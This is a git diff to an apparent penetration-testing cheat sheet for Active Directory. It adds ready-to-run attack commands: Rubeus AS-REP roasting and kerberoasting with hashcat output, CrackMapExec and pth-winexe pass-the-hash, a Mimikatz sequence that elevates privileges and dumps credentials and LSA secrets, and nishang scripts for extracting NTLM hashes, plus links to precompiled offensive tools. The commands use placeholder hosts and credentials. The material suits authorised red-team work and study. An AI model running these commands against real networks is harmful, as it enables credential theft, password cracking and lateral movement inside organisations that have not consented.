@@ -37,7 +37,9 @@ Example bloodhound-python:
 > bloodhound-python -c All -u 'username' -p 'password' -gc "MACHINE.domain.local" -dc "MACHINE.domain.local" -d "domain.local" -ns 10.10.10.10
 
 Example SharpHound
-https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors
+> cp /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1 ./
+> cp /usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe ./
+
 > Import-module .\SharpHound.ps1
 > Invoke-Bloodhound -CollectionMethod All [-d domain.local]
 Or at once:
@@ -53,6 +55,18 @@ Or at once:
 > Get-NetSession -ComputerName dc01
 ```
 
+###### Compiling Rubeus
+```
+https://github.com/GhostPack/Rubeus
+
+Instructions:
+https://github.com/GhostPack/Rubeus#compile-instructions
+https://specterops.gitbook.io/ghostpack/rubeus/introduction/compilation-instructions
+
+Or get a pre-compiled version here:
+https://github.com/Flangvik/SharpCollection
+```
+
 ###### Kerberos ~ validating usernames
 ```
 https://github.com/ropnop/kerbrute
@@ -66,7 +80,8 @@ From external with Impacket:
 > impacket-GetNPUsers domain.local/ -format john -usersfile wordlist -no-pass -dc-ip 10.10.10.10
 
 With Rubeus:
-https://pentestbook.six2dez.com/post-exploitation/windows/ad/kerberos-attacks
+> .\Rubeus.exe asreproast
+> .\Rubeus.exe asreproast /user:username /domain:domain.local /format:hashcat /outfile:file.out
 
 Password dictionary attack:
 > john tgt-file --wordlist=/usr/share/wordlists/rockyou.txt
@@ -80,8 +95,8 @@ From external with Impacket:
 > GetUserSPNs.py -request -dc-ip 10.10.10.10 domain.local/username -save -outputfile tgsfile.out
 
 With Rubeus:
-https://pentestbook.six2dez.com/post-exploitation/windows/ad/kerberos-attacks
-
+> .\Rubeus.exe kerberoast
+> .\Rubeus.exe kerberoast /user:username /domain:domain.local /format:hashcat /outfile:file.out
 
 Password dictionary attack:
 > hashcat -m 13100 -a 0 tgsfile.out /usr/share/wordlists/rockyou.txt --force
@@ -89,6 +104,10 @@ or:
 > python3 /usr/share/kerberoast/tgsrepcrack.py wordlist.txt ticketname
 ```
 
+###### More Kerberos attacks:
+```
+https://pentestbook.six2dez.com/post-exploitation/windows/ad/kerberos-attacks
+```
 
 ###### DC-SYNC attack
 ```
@@ -105,13 +124,12 @@ with Mimikatz:
 
 ###### Pass The Hash with CrackMapExec
 ```
-
+> crackmapexec smb 10.10.10.10 -u username -H h1a2s3h4:h1a2s3h4
 ```
 
 ###### Pass the Hash with PTH
 ```
 > pth-winexe -U username%hAsHPaRt1:hAsHPaRt2 //10.10.10.10 cmd
-
 ```
 
 ###### Overpass the hash
@@ -127,16 +145,16 @@ https://pentestbook.six2dez.com/post-exploitation/windows/ad/kerberos-attacks
 
 ###### Mimikatz ~ Retrieve stored credentials
 ```
-The powershell module:
-https://github.com/samratashok/nishang/tree/master/Gather
-
-the EXE variant:
 https://github.com/gentilkiwi/mimikatz
-cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe ./
 
+> cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe ./
+
+Start Mimikatz from CMD
 > .\mimikatz.exe
 > privilege::debug
 > token::elevate
+
+Save output of the next commands in a file:
 > log file.out
 
 sekurlsa
@@ -155,8 +173,6 @@ lsadump
 > lsadump::secrets
 > lsadump::cache
 > token::revert
-
-> sekurlsa::pth /user:some_admin /domain:domain.com /ntlm:hAsHPaRt2 /run:PowerShell.exe
 ```
 
 ###### Retrieve stored credentials (manual)
@@ -164,8 +180,8 @@ lsadump
 view stored kerberos tickets:
 > klist
 
-https://github.com/samratashok/nishang/tree/master/Gather
 gather NTLM hashes with nishang script:
+https://github.com/samratashok/nishang/tree/master/Gather
 > Import-Module .\Get-PassHashes.ps1
 > Get-PassHashes
 ```
